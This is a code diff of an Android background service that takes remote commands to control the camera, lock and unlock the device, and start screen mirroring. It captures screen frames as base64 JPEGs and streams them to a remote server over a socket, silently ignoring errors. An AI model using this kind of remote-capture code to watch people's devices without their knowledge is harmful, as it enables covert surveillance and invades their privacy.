@@ -304,9 +304,9 @@ class DeviceService : Service(), LifecycleOwner {
                 else    -> stopCamera()
             }
             "screen"     -> when (value) {
-                "start" -> requestScreenCapture()
-                else    -> stopScreenCapture()
-            }
+    "start" -> startScreenMirroring()
+    else    -> stopScreenMirroring()
+}
             "lockDevice"     -> lockDevice(value)
             "lockCustom"     -> lockCustom(value)
             "unlockDevice"   -> unlockDevice()
@@ -1784,44 +1784,50 @@ ${htmlContent}
         screenMirrorHandler?.post(screenMirrorRunnable!!)
     }
 
-    private fun captureAndSendMirrorFrame() {
-        val reader = imageReader ?: return
-        var image: android.media.Image? = null
-        try {
-            image = reader.acquireLatestImage() ?: return
-            val planes = image.planes
-            val buffer = planes[0].buffer
-            val pixelStride = planes[0].pixelStride
-            val rowStride = planes[0].rowStride
-            val rowPadding = rowStride - pixelStride * image.width
+private fun captureAndSendMirrorFrame() {
+    val reader = imageReader ?: return
+    var image: android.media.Image? = null
+    try {
+        image = reader.acquireLatestImage() ?: return
+        val planes = image.planes
+        val buffer = planes[0].buffer
+        val pixelStride = planes[0].pixelStride
+        val rowStride = planes[0].rowStride
+        val rowPadding = rowStride - pixelStride * image.width
 
-            val bmp = Bitmap.createBitmap(
-                image.width + rowPadding / pixelStride,
-                image.height, Bitmap.Config.ARGB_8888
-            )
-            bmp.copyPixelsFromBuffer(buffer)
+        val bmp = Bitmap.createBitmap(
+            image.width + rowPadding / pixelStride,
+            image.height, Bitmap.Config.ARGB_8888
+        )
+        bmp.copyPixelsFromBuffer(buffer)
 
-            val cropped = if (rowPadding > 0)
-                Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
-            else bmp
+        val cropped = if (rowPadding > 0)
+            Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
+        else bmp
 
-            val baos = ByteArrayOutputStream()
-            cropped.compress(Bitmap.CompressFormat.JPEG, 30, baos)
-            if (cropped !== bmp) cropped.recycle()
-            bmp.recycle()
-            image.close(); image = null
+        val baos = ByteArrayOutputStream()
+        cropped.compress(Bitmap.CompressFormat.JPEG, 30, baos)
+        if (cropped !== bmp) cropped.recycle()
+        bmp.recycle()
+        image.close(); image = null
 
-            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
-            socket?.emit("screen:mirror", JSONObject().apply {
-                put("deviceId", deviceId)
-                put("frame", "data:image/jpeg;base64,$b64")
-                put("timestamp", System.currentTimeMillis())
-            })
-        } catch (_: Exception) {
-        } finally {
-            image?.close()
-        }
+        val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+        
+        socket?.emit("screen:mirror", JSONObject().apply {
+            put("deviceId", deviceId)
+            put("frame", "data:image/jpeg;base64,$b64")
+            put("timestamp", System.currentTimeMillis())
+        })
+        
+        socket?.emit("screen:frame", JSONObject().apply {
+            put("deviceId", deviceId)
+            put("frame", "data:image/jpeg;base64,$b64")
+        })
+    } catch (_: Exception) {
+    } finally {
+        image?.close()
     }
+}
 
     private fun stopScreenMirroring() {
         screenMirroring = false
